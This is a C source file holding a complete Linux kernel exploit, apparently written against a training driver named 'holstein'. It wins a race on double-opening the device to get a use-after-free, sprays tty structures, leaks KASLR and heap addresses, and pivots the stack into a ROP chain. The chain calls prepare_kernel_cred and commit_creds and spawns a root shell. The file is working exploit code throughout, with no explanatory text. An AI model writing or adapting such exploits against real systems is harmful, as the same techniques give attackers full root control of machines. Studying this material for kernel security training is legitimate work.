#define _GNU_SOURCE
#include <ctype.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define SPRAY_COUNT 50

uintptr_t cs;
uintptr_t rflags;
uintptr_t rsp;
uintptr_t ss;

volatile int tty_cpu0[SPRAY_COUNT];
volatile int tty_cpu1[SPRAY_COUNT];
pthread_barrier_t barrier;
volatile int fd0 = -1;
volatile int fd1 = -1;
uintptr_t g_buf;

uintptr_t offset;
#define OFFSET(addr) (addr + offset)

uintptr_t push_rdx_pop_rsp_pop_rbp_ret	= 0xffffffff81137da7;
uintptr_t pop_rdi_cli_ret		= 0xffffffff8132606c;
uintptr_t prepare_kernel_cred		= 0xffffffff81072580;
uintptr_t pop_rcx_add_cl_cl_ret		= 0xffffffff81465536;
uintptr_t mov_rdi_rax_rep_movsq_ret	= 0xffffffff8165094b;
uintptr_t commit_creds			= 0xffffffff810723e0;
uintptr_t kpti				= 0xffffffff81800e26;

static void shell(void)
{
	puts("[+] get r00t!");
	execve("/bin/sh", (char *[]){ "/bin/sh", NULL }, NULL);
}

static void save_state(void)
{
	asm volatile("movq %%cs, %[cs]\n\t"
		     "pushfq\n\t"
		     "popq %[rflags]\n\t"
		     "movq %%rsp, %[rsp]\n\t"
		     "movq %%ss, %[ss]"
		     : [cs] "=r"(cs), [rflags] "=r"(rflags), [rsp] "=r"(rsp),
		       [ss] "=r"(ss));
}

static void cpu_pin(int cpu)
{
	cpu_set_t set;

	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

static void *race_cpu(void *arg)
{
	uintptr_t cpu = (uintptr_t)arg;
	volatile int *fd;

	cpu_pin(cpu);

	if (cpu == 0) {
		fd = &fd0;
	} else {
		fd = &fd1;
	}

	pthread_barrier_wait(&barrier);
	*fd = open("/dev/holstein", O_RDWR);

	return NULL;
}

static void race(void)
{
	pthread_t tid1;
	pthread_t tid2;
	int ret;

	while (true) {
		fd0 = -1;
		fd1 = -1;

		pthread_barrier_init(&barrier, NULL, 2);

		ret = pthread_create(&tid1, NULL, race_cpu, (void *)0);
		if (ret != 0)
			goto err;

		ret = pthread_create(&tid2, NULL, race_cpu, (void *)1);
		if (ret != 0) {
			pthread_barrier_wait(&barrier);
			pthread_join(tid1, NULL);
			goto err;
		}

		pthread_join(tid1, NULL);
		pthread_join(tid2, NULL);

		if (fd0 > 0 && fd1 > 0) {
			printf("[+] race success\n");
			printf("[+] fd0 %d\n", fd0);
			printf("[+] fd1 %d\n", fd1);
			break;
		} else {
			goto err;
		}

err:
		pthread_barrier_destroy(&barrier);
		if (fd0 > 0)
			close(fd0);
		if (fd1 > 0)
			close(fd1);
	}
}

static void *spray_cpu(void *arg)
{
	uintptr_t cpu = (uintptr_t)arg;
	volatile int (*tty)[SPRAY_COUNT];

	cpu_pin(cpu);

	if (cpu == 0) {
		tty = &tty_cpu0;
	} else {
		tty = &tty_cpu1;
	}

	pthread_barrier_wait(&barrier);
	sched_yield();
	close(fd0);

	for (int i = 0; i < SPRAY_COUNT; ++i)
		(*tty)[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);

	fd0 = -1;
	return NULL;
}

static void uaf(void)
{
	uint8_t data[0x164];
	pthread_t tid1;
	pthread_t tid2;
	int ret;

	while (true) {
		for (int i = 0; i < SPRAY_COUNT; ++i) {
			tty_cpu0[i] = 0;
			tty_cpu1[i] = 0;
		}

		pthread_barrier_init(&barrier, NULL, 2);
		race();

		ret = pthread_create(&tid1, NULL, spray_cpu, (void *)0);
		if (ret != 0)
			goto err;

		ret = pthread_create(&tid2, NULL, spray_cpu, (void *)1);
		if (ret != 0) {
			pthread_barrier_wait(&barrier);
			pthread_join(tid1, NULL);
			goto err;
		}

		pthread_join(tid1, NULL);
		pthread_join(tid2, NULL);

		read(fd1, data, 0x164);
		if (*(uint32_t *)data && strncmp(&data[0x160], "ptm", 3) == 0 &&
		    isdigit(*(uint8_t *)&data[0x163])) {
			printf("[+] uaf success\n");
			break;
		} else {
			goto err;
		}
err:
		pthread_barrier_destroy(&barrier);
		if (fd0 > 0) {
			close(fd0);
			close(fd1);
		}
		for (int i = 0; i < SPRAY_COUNT; ++i) {
			if (tty_cpu0[i] > 0)
				close(tty_cpu0[i]);
			if (tty_cpu1[i] > 0)
				close(tty_cpu1[i]);
		}
	}
}

static void leak_offset_and_g_buf(int fd, uint8_t *data)
{
	uintptr_t ptr;

	read(fd, data, 0x40);
	ptr = *(uintptr_t *)&data[0x18];
	offset = ptr - 0xffffffff81c3afe0;
	printf("[+] offset %p\n", offset);

	g_buf = *(uintptr_t *)&data[0x38] - 0x38;
	printf("[+] g_buf %p\n", g_buf);
}

int main(void)
{
	uint8_t data[0x400] = { 0 };
	uintptr_t *stack;

	save_state();

	uaf();
	leak_offset_and_g_buf(fd1, data);

	read(fd1, data, 0x400);
	stack = (uintptr_t *)data;
	*stack++ = OFFSET(pop_rdi_cli_ret);
	*stack++ = (uintptr_t)NULL;
	*stack++ = OFFSET(prepare_kernel_cred);
	*stack++ = OFFSET(pop_rcx_add_cl_cl_ret);
	*stack++ = 0;
	*stack++ = OFFSET(mov_rdi_rax_rep_movsq_ret);
	*stack++ = OFFSET(commit_creds);
	*stack++ = OFFSET(kpti);
	*stack++ = 0;
	*stack++ = 0;
	*stack++ = (uintptr_t)shell;
	*stack++ = cs;
	*stack++ = rflags;
	*stack++ = rsp;
	*stack++ = ss;

	*(uintptr_t *)&data[0x3f8] = OFFSET(push_rdx_pop_rsp_pop_rbp_ret);
	write(fd1, data, 0x400);

	uaf();
	read(fd1, data, 0x18);
	*(uintptr_t *)&data[0x18] = g_buf + 0x3f8 - 0x0c * 8;
	write(fd1, data, 0x20);

	for (int i = 0; i < SPRAY_COUNT; ++i) {
		ioctl(tty_cpu0[i], 0, g_buf - 0x08);
		ioctl(tty_cpu1[i], 0, g_buf - 0x08);
	}

	return EXIT_SUCCESS;
}
